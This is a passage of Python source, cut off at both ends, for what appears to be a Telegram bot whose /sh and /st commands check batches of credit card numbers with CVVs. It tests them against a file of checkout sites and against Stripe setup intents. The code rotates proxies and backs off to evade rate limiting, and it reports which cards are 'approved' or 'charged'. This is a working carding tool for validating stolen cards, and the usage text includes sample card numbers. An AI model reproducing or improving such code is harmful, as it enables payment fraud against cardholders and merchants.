                pass
    except Exception:
        pass
    if proxy_candidate_raw:
        normalized_proxy = _normalize_proxy_url_inline(proxy_candidate_raw)
        if not normalized_proxy:
            try:
                await update.message.reply_text("Provided proxy format is invalid. Expected host:port or user:pass@host:port (scheme optional). Proceeding without it.")
            except Exception:
                pass
        else:
            try:
                loop = asyncio.get_running_loop()
                test_result = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    cards[0],
                    list(sites),
                    {"http": normalized_proxy, "https": normalized_proxy}
                )
                if len(test_result) == 7:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = test_result
                elif len(test_result) == 6:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
                    receipt_id = None
                else:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
                    receipt_id = None
            except Exception:
                status = "unknown"
                code_display = '"code": "UNKNOWN"'
                amount_display = "$0"
                site_label = ""
                used_proxy_url = None
                site_url = None
                receipt_id = None

            if status != "unknown":
                proxies_override = {"http": normalized_proxy, "https": normalized_proxy}
                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    existing = await get_user_proxies(user.id)
                    if isinstance(existing, list) and (normalized_proxy in existing):
                        await update.message.reply_text("Proxy Already Added")
                    else:
                        await add_user_proxy(user.id, display_name, user.username, normalized_proxy)
                        await update.message.reply_text("Added 1 Proxy")
                except Exception:
                    pass
            else:
                try:
                    await update.message.reply_text("Proxy Dead")
                except Exception:
                    pass

    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    runner = BatchRunner(cards, sites, GLOBAL_EXECUTOR, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, proxies_override=proxies_override)
    try:
        async with ACTIVE_LOCK:
            ACTIVE_BATCHES[batch_id] = {
                "event": cancel_event,
                "tasks": [],
                "chat_id": update.effective_chat.id,
                "user_id": update.effective_user.id,
                "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                "user_username": getattr(update.effective_user, "username", None),
                "progress": (None, None),
                "counts": {
                    "total": len(cards),
                    "processed": 0,
                    "approved": 0,
                    "declined": 0,
                    "charged": 0,
                    "start_ts": runner.start_ts,
                    "title": "SH Batch",
                },
            }
    except Exception:
        pass
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": "SH Batch",
            "cards": cards,
            "sites": sites,
            "send_approved_notifications": True
        })
    except Exception:
        pass
    context.application.create_task(runner.run_with_notifications(update, context, title="SH Batch"))

async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await ensure_access(update, context):
        return
    
    user = update.effective_user
    
    # Check if user already has an active batch (admins bypass)
    if await has_active_batch(user.id):
        await update.message.reply_text(
            "⏸️ <b>Already Running a Check</b>\n\n"
            "You already have an active check running. Please wait for it to complete or use /stop to cancel it.\n\n"
            "You can only run one check at a time.",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        user_proxies = await get_user_proxies(user.id)
        if not user_proxies:
            await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
            return
    except Exception:
        await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
        return
    
    full_text = (update.message.text or "").strip()
    body = ""

    try:
        if full_text.lower().startswith("/sh"):
            body = full_text.split(" ", 1)[1] if " " in full_text else ""
    except Exception:
        body = ""

    if not body:
        parts = full_text.split("\n", 1)
        if len(parts) >= 2 and parts[1].strip():
            body = parts[1].strip()

    if not body:
        replied = update.message.reply_to_message
        if replied and isinstance(getattr(replied, "text", None), str) and replied.text.strip():
            body = replied.text.strip()

    if not body:
        await update.message.reply_text("Usage:\n/sh <single CC or multiline CCs>")
        return

    def _normalize_proxy_url_inline(p: Optional[str]) -> Optional[str]:
        try:
            if not p:
                return None
            s = p.strip()
            if not s or s.startswith("#"):
                return None
            lower = s.lower()
            if lower.startswith(("http://", "https://", "socks5://", "socks5h://")):
                return s
            parts = s.split(":")
            if len(parts) >= 4:
                host = parts[0]
                port = parts[1]
                user = ":".join(parts[2:-1]) if len(parts) > 4 else parts[2]
                pwd = parts[-1]
                try:
                    from urllib.parse import quote as _q
                except Exception:
                    def _q(x, safe=""):
                        return x
                user_enc = _q(user, safe="")
                pwd_enc = _q(pwd, safe="")
                return f"http://{user_enc}:{pwd_enc}@{host}:{port}"
            return f"http://{s}"
        except Exception:
            return None

    def _extract_proxy_from_text_inline(text: str) -> Tuple[Optional[str], str]:
        try:
            lines = (text or "").splitlines()
        except Exception:
            return None, text
        proxy_raw = None
        remaining = []
        for ln in lines:
            s = (ln or "").strip()
            low = s.lower()
            if low.startswith("proxy=") or low.startswith("proxy:") or low.startswith("proxy "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            if low.startswith("px=") or low.startswith("px:") or low.startswith("px "):
                proxy_raw = s.split("=",1)[1].strip() if "=" in s else s.split(":",1)[1].strip() if ":" in s else s.split(" ",1)[1].strip() if " " in s else ""
                continue
            remaining.append(ln)
        return (proxy_raw if proxy_raw else None), "\n".join(remaining)

    proxy_candidate_raw, body_clean = _extract_proxy_from_text_inline(body)
    cards = parse_cards_from_text(body_clean)
    if not cards:
        await update.message.reply_text("No valid CC entries provided.")
        return

    orig_total = len(cards)
    if orig_total > 100:
        await update.message.reply_text(f"Limit is 100 CC for /sh. Received {orig_total}, processing first 100.")
        cards = cards[:100]

    sites = checkout.read_sites_from_file("working_sites.txt")
    if not sites:
        await update.message.reply_text("No sites found in working_sites.txt.")
        return

    proxies_override = None
    try:
        saved_list = await get_user_proxies(update.effective_user.id)
        if isinstance(saved_list, list) and len(saved_list) > 0:
            proxies_override = list(saved_list)
            try:
                await update.message.reply_text(f"🔒 Using your {len(saved_list)} saved {'proxy' if len(saved_list) == 1 else 'proxies'}")
            except Exception:
                pass
    except Exception:
        pass
    if proxy_candidate_raw:
        normalized_proxy = _normalize_proxy_url_inline(proxy_candidate_raw)
        if not normalized_proxy:
            try:
                await update.message.reply_text("Provided proxy format is invalid. Expected host:port or user:pass@host:port (scheme optional). Proceeding without it.")
            except Exception:
                pass
        else:
            try:
                loop = asyncio.get_running_loop()
                test_result = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    check_single_card,
                    cards[0],
                    list(sites),
                    {"http": normalized_proxy, "https": normalized_proxy}
                )
                if len(test_result) == 7:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = test_result
                elif len(test_result) == 6:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
                    receipt_id = None
                else:
                    status, code_display, amount_display, site_label, used_proxy_url, site_url = test_result
                    receipt_id = None
            except Exception:
                status = "unknown"
                code_display = '"code": "UNKNOWN"'
                amount_display = "$0"
                site_label = ""
                used_proxy_url = None
                site_url = None
                receipt_id = None

            if status != "unknown":
                proxies_override = {"http": normalized_proxy, "https": normalized_proxy}
                try:
                    user = update.effective_user
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = f"@{uname}" if uname else str(user.id)
                    existing = await get_user_proxies(user.id)
                    if isinstance(existing, list) and (normalized_proxy in existing):
                        await update.message.reply_text("Proxy Already Added")
                    else:
                        await add_user_proxy(user.id, display_name, user.username, normalized_proxy)
                        await update.message.reply_text("Added 1 Proxy")
                except Exception:
                    pass
            else:
                try:
                    await update.message.reply_text("Proxy Dead")
                except Exception:
                    pass

    batch_id = f"{update.effective_chat.id}:{int(time.time())}"
    cancel_event = asyncio.Event()
    
    # If card count is less than 5, process individually with detailed messages
    if len(cards) < 5:
        # Process cards individually and send detailed messages
        async def process_cards_individually():
            approved = 0
            declined = 0
            charged = 0
            processed = 0
            start_ts = time.time()
            
            try:
                async with ACTIVE_LOCK:
                    ACTIVE_BATCHES[batch_id] = {
                        "event": cancel_event,
                        "tasks": [],
                        "chat_id": update.effective_chat.id,
                        "user_id": update.effective_user.id,
                        "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                        "user_username": getattr(update.effective_user, "username", None),
                        "progress": (None, None),
                        "counts": {
                            "total": len(cards),
                            "processed": 0,
                            "approved": 0,
                            "declined": 0,
                            "charged": 0,
                            "start_ts": start_ts,
                            "title": "SH Batch",
                        },
                    }
            except Exception:
                pass
            
            user = update.effective_user
            user_id = user.id
            display_name = (user.full_name or "").strip()
            if not display_name:
                uname = (user.username or "").strip()
                display_name = f"@{uname}" if uname else str(user.id)
            
            # Initialize proxy rotation index for retries
            current_proxy_idx = 0
            # Get user's proxy list for retry logic
            user_proxies_list = []
            try:
                user_proxies_list = await get_user_proxies(user_id)
                if not isinstance(user_proxies_list, list):
                    user_proxies_list = []
            except Exception:
                user_proxies_list = []
            
            for idx, card in enumerate(cards, 1):
                if cancel_event.is_set():
                    break
                
                # Retry loop for proxy errors
                max_retries = len(user_proxies_list) if len(user_proxies_list) > 1 else 1
                retry_count = 0
                card_processed = False
                
                while retry_count < max_retries and not card_processed:
                    try:
                        # Select proxy for this attempt
                        if user_proxies_list and len(user_proxies_list) > 0:
                            proxy_idx = (current_proxy_idx + retry_count) % len(user_proxies_list)
                            selected_proxy = user_proxies_list[proxy_idx]
                            current_proxies_override = {"http": selected_proxy, "https": selected_proxy}
                        else:
                            current_proxies_override = proxies_override
                        
                        loop = asyncio.get_running_loop()
                        result = await loop.run_in_executor(
                            GLOBAL_EXECUTOR,
                            check_single_card,
                            card,
                            sites,
                            current_proxies_override,
                            None
                        )
                        
                        if len(result) == 7:
                            status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = result
                        elif len(result) == 6:
                            status, code_display, amount_display, site_label, used_proxy_url, site_url = result
                            receipt_id = None
                        else:
                            status, code_display, amount_display, site_label = result[:4]
                            receipt_id = None
                        
                        processed += 1
                        card_processed = True
                        
                        if status == "approved":
                            approved += 1
                        elif status == "charged":
                            charged += 1
                        elif status == "declined":
                            declined += 1
                        
                        # Update proxy index on success
                        if user_proxies_list and len(user_proxies_list) > 0:
                            current_proxy_idx = (current_proxy_idx + 1) % len(user_proxies_list)
                        
                        # Send detailed notification using result_notify_text
                        notify_text = result_notify_text(
                            card, status, code_display, amount_display, 
                            site_label, display_name, receipt_id, user_id
                        )
                        
                        await update.effective_chat.send_message(
                            text=notify_text,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                        
                        # Update ACTIVE_BATCHES
                        try:
                            async with ACTIVE_LOCK:
                                rec = ACTIVE_BATCHES.get(batch_id)
                                if rec is not None:
                                    rec["counts"]["processed"] = processed
                                    rec["counts"]["approved"] = approved
                                    rec["counts"]["declined"] = declined
                                    rec["counts"]["charged"] = charged
                                    ACTIVE_BATCHES[batch_id] = rec
                        except Exception:
                            pass
                        
                    except Exception as e:
                        logger.error(f"Error processing card {idx} in /sh (attempt {retry_count + 1}): {e}")
                        
                        # Check if error is proxy-related
                        err_msg_lower = str(e).lower()
                        is_proxy_error = any(sig in err_msg_lower for sig in [
                            "urllib3", "connectionpool", "proxyerror", "unable to connect to proxy",
                            "tunnel connection failed", "connection refused", "connection timed out",
                            "httpsconnection", "httpconnection", "proxy connection", "can't parse entities"
                        ])
                        
                        # If proxy error and we have multiple proxies, retry with next proxy
                        if is_proxy_error and user_proxies_list and len(user_proxies_list) > 1 and retry_count < max_retries - 1:
                            retry_count += 1
                            logger.info(f"Proxy error detected, retrying card {idx} with next proxy (attempt {retry_count + 1}/{max_retries})")
                            continue  # Retry with next proxy
                        else:
                            # No more retries or not a proxy error - mark as failed
                            processed += 1
                            declined += 1
                            card_processed = True
                            
                            # Update proxy index even on failure
                            if user_proxies_list and len(user_proxies_list) > 0:
                                current_proxy_idx = (current_proxy_idx + 1) % len(user_proxies_list)
                            
                            # Send error notification (escape HTML to prevent parsing errors)
                            try:
                                from html import escape
                                error_msg_escaped = escape(str(e)[:200])
                                error_text = (
                                    f"❌ <b>Error Checking Card</b>\n\n"
                                    f"💳 <b>Card:</b> <code>{card.get('number', 'N/A')}|{card.get('month', 'N/A')}|{card.get('year', 'N/A')}|{card.get('verification_value', 'N/A')}</code>\n"
                                    f"⚠️ <b>Error:</b> <code>{error_msg_escaped}</code>"
                                )
                                await update.effective_chat.send_message(
                                    text=error_text,
                                    parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True
                                )
                            except Exception as send_err:
                                # If HTML parsing fails, send without HTML
                                try:
                                    error_msg_safe = str(e)[:200].replace('<', '&lt;').replace('>', '&gt;')
                                    await update.effective_chat.send_message(
                                        text=f"❌ Error Checking Card\n\nCard: {card.get('number', 'N/A')}|{card.get('month', 'N/A')}|{card.get('year', 'N/A')}|{card.get('verification_value', 'N/A')}\nError: {error_msg_safe}",
                                        disable_web_page_preview=True
                                    )
                                except Exception:
                                    pass
            
            # Clean up ACTIVE_BATCHES
            try:
                async with ACTIVE_LOCK:
                    ACTIVE_BATCHES.pop(batch_id, None)
            except Exception:
                pass
        
        context.application.create_task(process_cards_individually())
    else:
        # Use batch processing with summary format for 5+ cards
        runner = BatchRunner(cards, sites, GLOBAL_EXECUTOR, batch_id, update.effective_chat.id, update.effective_user.id, cancel_event, proxies_override=proxies_override)
        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES[batch_id] = {
                    "event": cancel_event,
                    "tasks": [],
                    "chat_id": update.effective_chat.id,
                    "user_id": update.effective_user.id,
                    "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
                    "user_username": getattr(update.effective_user, "username", None),
                    "progress": (None, None),
                    "counts": {
                        "total": len(cards),
                        "processed": 0,
                        "approved": 0,
                        "declined": 0,
                        "charged": 0,
                        "start_ts": runner.start_ts,
                        "title": "SH Batch",
                    },
                }
        except Exception:
            pass
        try:
            await add_pending(batch_id, {
                "batch_id": batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": "SH Batch",
                "cards": cards,
                "sites": sites,
                "send_approved_notifications": True
            })
        except Exception:
            pass
        context.application.create_task(runner.run_with_notifications(update, context, title="SH Batch"))

async def cmd_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check credit cards using Stripe setup intent (st.py)"""
    user = update.effective_user
    chat = update.effective_chat
    
    # Check if user already has an active batch (admins bypass)
    if await has_active_batch(user.id):
        await update.message.reply_text(
            "⏸️ <b>Already Running a Check</b>\n\n"
            "You already have an active check running. Please wait for it to complete or use /stop to cancel it.\n\n"
            "You can only run one check at a time.",
            parse_mode=ParseMode.HTML
        )
        return
    logger.info(f"========== /st COMMAND STARTED ==========")
    logger.info(f"User: {user.full_name} (@{user.username}) [ID: {user.id}]")
    logger.info(f"Chat: {chat.title or chat.type} [ID: {chat.id}]")
    
    if not await ensure_access(update, context):
        logger.info(f"Access denied for user {user.id}")
        return
    
    # Check for user's proxy - REQUIRED like /txt, /sh, and /sc
    try:
        user_proxies = await get_user_proxies(user.id)
        if not user_proxies:
            await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
            return
    except Exception:
        await update.message.reply_text("❌ <b>Proxy Required</b>\n\nPlease add a proxy first with /setpr", parse_mode=ParseMode.HTML)
        return

    # Initialize proxy rotation
    proxy_index = 0
    current_proxy = user_proxies[proxy_index]
    logger.info(f"Starting with proxy {proxy_index + 1}/{len(user_proxies)}: {current_proxy[:20]}...")
    try:
        await update.message.reply_text(f"🔒 Using your {len(user_proxies)} saved {'proxy' if len(user_proxies) == 1 else 'proxies'}")
    except Exception:
        pass
    
    import uuid
    batch_id = f"st_{user.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    cancel_event = asyncio.Event()
    
    full_text = (update.message.text or "").strip()
    logger.info(f"Full command text: {full_text}")
    
    replied_to = update.message.reply_to_message
    if replied_to and replied_to.text:
        replied_text = replied_to.text.strip()
        logger.info(f"This is a reply to a message: {replied_text[:100]}")
        cards_from_reply = parse_cards_from_text(replied_text)
        if cards_from_reply:
            logger.info(f"Found {len(cards_from_reply)} card(s) in replied message")
            cards_input = []
            for card in cards_from_reply:
                card_str = f"{card['number']}|{card['month']:02d}|{card['year']}|{card['verification_value']}"
                cards_input.append(card_str)
        else:
            cards_input = []
    else:
        cards_input = []
        try:
            if full_text.lower().startswith("/st"):
                lines = full_text.split("\n")
                
                first_line = lines[0].strip()
                parts = first_line.split(" ", 1)
                if len(parts) >= 2:
                    cards_input.append(parts[1].strip())
                
                for line in lines[1:]:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        cards_input.append(line)
        except Exception:
            pass
    
    if not cards_input:
        logger.warning("No cards provided in /st command")
        await update.message.reply_text(
            "Usage: /st <card> or /st <card1>\\n<card2>\\n...\n\n"
            "Examples:\n"
            "Single card:\n"
            "/st 5429338632473654|12|2028|490\n\n"
            "Multiple cards:\n"
            "/st 5421880346864254|06|26|948\n"
            "5429338632473654|12|2028|490\n\n"
            "💡 You can also reply to any message containing cards with /st\n\n"
            "Format: number|month|year|cvc"
        )
        return
    
    logger.info(f"Extracted {len(cards_input)} card(s) from input")
    
    # Remove duplicates while preserving order
    seen_cards = set()
    unique_cards_input = []
    for card_input in cards_input:
        card_key = card_input.strip().lower()
        if card_key not in seen_cards:
            seen_cards.add(card_key)
            unique_cards_input.append(card_input)
    
    if len(cards_input) != len(unique_cards_input):
        logger.info(f"Removed {len(cards_input) - len(unique_cards_input)} duplicate card(s) from /st input")
        await update.message.reply_text(f"ℹ️ Removed {len(cards_input) - len(unique_cards_input)} duplicate card(s) from input")
    
    cards = []
    failed_cards = []
    for card_input in unique_cards_input:
        try:
            parsed = checkout.parse_cc_line(card_input)
            if parsed:
                cards.append({
                    'number': parsed['number'],
                    'exp_month': f"{parsed['month']:02d}",
                    'exp_year': str(parsed['year']),
                    'cvc': parsed['verification_value']
                })
            else:
                failed_cards.append(card_input)
        except Exception as e:
            logger.error(f"Error parsing card '{card_input}': {e}")
            failed_cards.append(card_input)
    
    if failed_cards:
        await update.message.reply_text(
            f"❌ Could not parse {len(failed_cards)} card(s):\n" + 
            "\n".join(f"• {c[:50]}" for c in failed_cards[:5]) +
            ("\n..." if len(failed_cards) > 5 else "") +
            "\n\nSupported formats:\n"
            "• 4520112895857270|04|27|393\n"
            "• 4520112895857270 04 27 393\n"
            "• card: 4520112895857270, exp: 04/27, cvv: 393\n"
            "• 4520 1128 9585 7270|04|2027|393"
        )
        if not cards:
            return
    
    logger.info(f"Successfully parsed {len(cards)} card(s)")
    for i, card in enumerate(cards, 1):
        logger.info(f"  Card {i}: {card['number'][:6]}...{card['number'][-4:]} | {card['exp_month']}/{card['exp_year']}")
    
    start_ts = time.time()
    async with ACTIVE_LOCK:
        ACTIVE_BATCHES[batch_id] = {
            "event": cancel_event,
            "chat_id": update.effective_chat.id,
            "user_id": update.effective_user.id,
            "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(update.effective_user.id)),
            "user_username": getattr(update.effective_user, "username", None),
            "counts": {
                "total": len(cards),
                "processed": 0,
                "approved": 0,
                "declined": 0,
                "start_ts": start_ts,
                "title": "ST Batch",
            },
        }
    
    # Save to pending so it can resume after reboot
    try:
        await add_pending(batch_id, {
            "batch_id": batch_id,
            "user_id": update.effective_user.id,
            "chat_id": update.effective_chat.id,
            "title": "ST Batch",
            "cards": [{"number": c['number'], "month": int(c['exp_month']), "year": int(c['exp_year']), "verification_value": c['cvc']} for c in cards],
            "sites": [],  # ST doesn't use sites
            "send_approved_notifications": True,
            "processed": 0
        })
    except Exception:
        pass
    
    total_cards = len(cards)
    stop_button = InlineKeyboardMarkup([[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{batch_id}")]])
    summary_msg = await update.message.reply_text(
        f"🔍 Checking {total_cards} card{'s' if total_cards > 1 else ''}...\n"
        f"⏳ Please wait...",
        reply_markup=stop_button
    )
    
    approved = 0
    declined = 0
    
    last_progress_update = 0.0
    progress_update_interval = 2.0
    
    logger.info(f"Starting card checking process for {total_cards} card(s)")
    
    for idx, card_details in enumerate(cards, 1):
        if cancel_event.is_set():
            logger.info(f"❌ Batch {batch_id} was cancelled by user")
            await summary_msg.edit_text(
                f"⏹ <b>Checking Stopped!</b>\n\n"
                f"<b>Total:</b> {total_cards}\n"
                f"<b>Processed:</b> {idx - 1}/{total_cards}\n"
                f"<b>Approved:</b> {approved} ✅\n"
                f"<b>Declined:</b> {declined} ❌",
                parse_mode=ParseMode.HTML,
                reply_markup=None
            )
            break
            
        logger.info(f"---------- Checking card {idx}/{total_cards} ----------")
        logger.info(f"Card: {card_details['number'][:6]}...{card_details['number'][-4:]} | {card_details['exp_month']}/{card_details['exp_year']} | CVV: {card_details['cvc']}")
        try:
            current_time = time.time()
            if current_time - last_progress_update >= progress_update_interval:
                await summary_msg.edit_text(
                    f"🔍 Checking card {idx}/{total_cards}...\n"
                    f"⏳ Card ending in {card_details['number'][-4:]}...\n\n"
                    f"✅ Approved: {approved}\n"
                    f"❌ Declined: {declined}",
                    reply_markup=stop_button
                )
                last_progress_update = current_time
            
            if idx > 1:
                # Increased delay to prevent 429 rate limiting
                delay = random.uniform(8.0, 12.0)  # 8-12 seconds between cards
                logger.info(f"Waiting {delay:.1f}s before next card to avoid rate limiting...")
                # Break delay into smaller chunks for cancellation responsiveness
                steps = int(delay * 2)  # 0.5s chunks
                for _ in range(steps):
                    if cancel_event.is_set():
                        break
                    await asyncio.sleep(0.5)
            
            loop = asyncio.get_running_loop()
            
            # Increased retries and delay to handle rate limiting better
            max_retries = 5  # More retries for 429 errors
            retry_delay = 8  # Longer delay between retries
            setup_intent_id = None
            client_secret = None
            
            for retry in range(max_retries):
                if cancel_event.is_set():
                    break
                    
                if retry > 0:
                    # On retry due to rate limit, rotate proxy
                    proxy_index = (proxy_index + 1) % len(user_proxies)
                    current_proxy = user_proxies[proxy_index]
                    logger.info(f"[ST-Step 1/3] Rotated to proxy {proxy_index + 1}/{len(user_proxies)} due to rate limit")
                    
                    wait_time = retry_delay * (2 ** (retry - 1))
                    logger.info(f"[ST-Step 1/3] Retry {retry}/{max_retries - 1} - Waiting {wait_time}s before retrying...")
                    for _ in range(int(wait_time * 2)):
                        if cancel_event.is_set():
                            break
                        await asyncio.sleep(0.5)
                
                logger.info(f"[ST-Step 1/3] Getting setup intent with proxy {proxy_index + 1}/{len(user_proxies)}... (Attempt {retry + 1}/{max_retries})")
                setup_intent_id, client_secret = await loop.run_in_executor(
                    GLOBAL_EXECUTOR, st.get_setup_intent, current_proxy
                )
                
                if setup_intent_id and client_secret:
                    logger.info(f"[ST-Step 1/3] Setup Intent ID: {setup_intent_id}")
                    logger.info(f"[ST-Step 1/3] Client Secret: {client_secret[:20]}...")
                    break
                else:
                    logger.warning(f"[ST-Step 1/3] Attempt {retry + 1} FAILED (likely rate limited)")
            
            if not setup_intent_id or not client_secret:
                declined += 1
                logger.warning(f"[ST-Step 1/3] FAILED after {max_retries} attempts - Could not get setup intent")
                await update.message.reply_text(
                    f"❌ <b>Failed to get setup intent after {max_retries} retries</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n"
                    f"<b>Reason:</b> Rate limited or server error",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            payment_method_id = None
            payment_method_data = None
            
            for retry in range(max_retries):
                if cancel_event.is_set():
                    break
                    
                if retry > 0:
                    # On retry due to rate limit, rotate proxy
                    proxy_index = (proxy_index + 1) % len(user_proxies)
                    current_proxy = user_proxies[proxy_index]
                    logger.info(f"[ST-Step 2/3] Rotated to proxy {proxy_index + 1}/{len(user_proxies)} due to rate limit")
                    
                    wait_time = retry_delay * (2 ** (retry - 1))
                    logger.info(f"[ST-Step 2/3] Retry {retry}/{max_retries - 1} - Waiting {wait_time}s before retrying...")
                    for _ in range(int(wait_time * 2)):
                        if cancel_event.is_set():
                            break
                        await asyncio.sleep(0.5)
                
                logger.info(f"[ST-Step 2/3] Creating payment method with proxy {proxy_index + 1}/{len(user_proxies)}... (Attempt {retry + 1}/{max_retries})")
                payment_method_id, payment_method_data = await loop.run_in_executor(
                    GLOBAL_EXECUTOR, st.create_payment_method, card_details, current_proxy
                )
                
                if payment_method_id and payment_method_data:
                    logger.info(f"[ST-Step 2/3] Payment Method ID: {payment_method_id}")
                    logger.info(f"[ST-Step 2/3] Payment Method Data: {payment_method_data}")
                    break
                else:
                    logger.warning(f"[ST-Step 2/3] Attempt {retry + 1} FAILED (likely rate limited)")
            
            if not payment_method_id or not payment_method_data:
                declined += 1
                logger.warning(f"[ST-Step 2/3] FAILED after {max_retries} attempts - Could not create payment method")
                await update.message.reply_text(
                    f"❌ <b>Failed to create payment method after {max_retries} retries</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n"
                    f"<b>Reason:</b> Rate limited or server error",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            success = False
            result = None
            
            for retry in range(max_retries):
                if cancel_event.is_set():
                    break
                    
                if retry > 0:
                    # On retry due to rate limit, rotate proxy
                    proxy_index = (proxy_index + 1) % len(user_proxies)
                    current_proxy = user_proxies[proxy_index]
                    logger.info(f"[ST-Step 3/3] Rotated to proxy {proxy_index + 1}/{len(user_proxies)} due to rate limit")
                    
                    wait_time = retry_delay * (2 ** (retry - 1))
                    logger.info(f"[ST-Step 3/3] Retry {retry}/{max_retries - 1} - Waiting {wait_time}s before retrying...")
                    for _ in range(int(wait_time * 2)):
                        if cancel_event.is_set():
                            break
                        await asyncio.sleep(0.5)
                
                logger.info(f"[ST-Step 3/3] Confirming setup intent with proxy {proxy_index + 1}/{len(user_proxies)}... (Attempt {retry + 1}/{max_retries})")
                success, result = await loop.run_in_executor(
                    GLOBAL_EXECUTOR,
                    st.confirm_setup_intent,
                    setup_intent_id,
                    client_secret,
                    payment_method_id,
                    payment_method_data,
                    card_details,
                    current_proxy
                )
                
                if success or (isinstance(result, dict) and result.get('error', {}).get('message', '') != 'Rate limited - too many requests. Please wait and try again.'):
                    logger.info(f"[ST-Step 3/3] Success: {success}")
                    logger.info(f"[ST-Step 3/3] Result: {result}")
                    break
                else:
                    logger.warning(f"[ST-Step 3/3] Attempt {retry + 1} FAILED (Rate limited)")
                    if retry == max_retries - 1:
                        logger.warning(f"[ST-Step 3/3] All {max_retries} attempts exhausted")
            
            if not success and (not result or (isinstance(result, dict) and result.get('error', {}).get('message', '') == 'Rate limited - too many requests. Please wait and try again.')):
                declined += 1
                await update.message.reply_text(
                    f"❌ <b>Failed to confirm setup intent after {max_retries} retries</b>\n\n"
                    f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n"
                    f"<b>Reason:</b> Rate limited - please try again later",
                    parse_mode=ParseMode.HTML
                )
                continue
            
            username = update.effective_user.username
            user_id = update.effective_user.id
            full_name = update.effective_user.full_name or str(user_id)
            username_display = f'<a href="tg://user?id={user_id}">{username if username else full_name}</a>'
            
            if success:
                approved += 1
                logger.info(f"✅ CARD APPROVED")
                card_info = payment_method_data.get('card', {})
                country = card_info.get('country', 'Unknown')
                display_brand = card_info.get('display_brand') or card_info.get('brand', 'Unknown')
                funding = card_info.get('funding', 'Unknown')
                
                status = result.get('status', 'Unknown')
                
                logger.info(f"Status: {status}, Brand: {display_brand}, Country: {country}, Type: {funding}")
                
                user_id = update.effective_user.id
                user_display_name = update.effective_user.full_name or update.effective_user.username or str(user_id)
                user_link = f'<a href="tg://user?id={user_id}">{user_display_name}</a>'
                
                response_text = (
                    f"✅ Approved\n"
                    f"Response: Card Added\n"
                    f"Card: <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n"
                    f"Status: {status}\n"
                    f"Brand: {display_brand}\n"
                    f"Country: {country}\n"
                    f"Type: {funding}\n"
                    f"User: {user_link}\n"
                    f"Gateway: Stripe Setup Intent"
                )
            else:
                declined += 1
                logger.warning(f"❌ CARD DECLINED")
                if isinstance(result, dict):
                    error_info = result.get('error', {})
                    error_code = error_info.get('code', 'Unknown')
                    decline_code = error_info.get('decline_code', 'N/A')
                    message = error_info.get('message', 'No message')
                    
                    payment_method = error_info.get('payment_method', {})
                    card_info = payment_method.get('card', {})
                    country = card_info.get('country', 'Unknown')
                    display_brand = card_info.get('display_brand') or card_info.get('brand', 'Unknown')
                    funding = card_info.get('funding', 'Unknown')
                    
                    logger.info(f"Error Code: {error_code}, Decline Code: {decline_code}, Message: {message}")
                    logger.info(f"Brand: {display_brand}, Country: {country}, Type: {funding}")
                    
                    response_text = (
                        f"❌ <b>Card Declined</b>\n\n"
                        f"<b>Card:</b> <code>{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']}</code>\n\n"
                        f"<b>Error Code:</b> {error_code}\n"
                        f"<b>Decline Code:</b> {decline_code}\n"
                        f"<b>Message:</b> {message}\n"
                        f"<b>Brand:</b> {display_brand}\n"
                        f"<b>Country:</b> {country}\n"
                        f"<b>Type:</b> {funding}\n"
                        f"<b>User:</b> {username_display}\n"
                        f"<b>Gateway:</b> Stripe Setup Intent"
                    )
                else:
                    logger.info(f"Error: {result}")
                    response_text = (
                        f"❌ <b>Card Declined</b>\n\n"
